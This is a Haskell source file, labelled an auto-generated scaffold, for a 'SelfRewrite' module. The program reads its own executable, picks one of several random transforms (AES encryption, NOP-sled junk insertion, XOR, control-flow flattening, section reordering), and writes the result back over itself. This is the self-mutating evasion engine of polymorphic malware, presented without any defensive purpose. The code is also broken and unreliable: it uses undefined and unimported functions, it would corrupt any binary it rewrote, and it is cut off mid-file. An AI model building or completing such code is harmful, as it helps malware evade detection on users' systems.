-- SelfRewrite.hs
-- Auto-generated scaffold.

module Core.SelfRewrite where

import System.IO
import System.Posix.Files
import Data.ByteString as BS
import Data.ByteString.Char8 as BSC
import Crypto.Cipher.AES
import Crypto.Cipher.Types
import System.Random
import Foreign.Ptr

mutateSelf :: IO ()
mutateSelf = do
    exePath <- getExecutablePath
    exeContent <- BS.readFile exePath
    mutated <- polymorphicTransform exeContent
    BS.writeFile exePath mutated
    setFileMode exePath accessModes

polymorphicTransform :: BS.ByteString -> IO BS.ByteString
polymorphicTransform bs = do
    method <- randomRIO (0, 5)
    case method of
        0 -> return $ aesEncrypt bs
        1 -> return $ insertJunkCode bs
        2 -> return $ controlFlowFlatten bs
        3 -> return $ xorTransform bs
        4 -> return $ reorderSections bs
        _ -> return $ compressCode bs

aesEncrypt :: BS.ByteString -> BS.ByteString
aesEncrypt bs = unsafePerformIO $ do
    key <- generateAESKey
    iv <- generateIV
    let cipher = throwCryptoError (cipherInit key :: CryptoError AES)
    return $ ctrCombine cipher iv bs

insertJunkCode :: BS.ByteString -> BS.ByteString
insertJunkCode bs = BS.concat [prefix, junk, suffix]
  where
    splitPoint = BS.length bs `div` 2
    (prefix, suffix) = BS.splitAt splitPoint bs
    junk = BS.pack [0x90, 0x90, 0x90]  -- NOP sled
    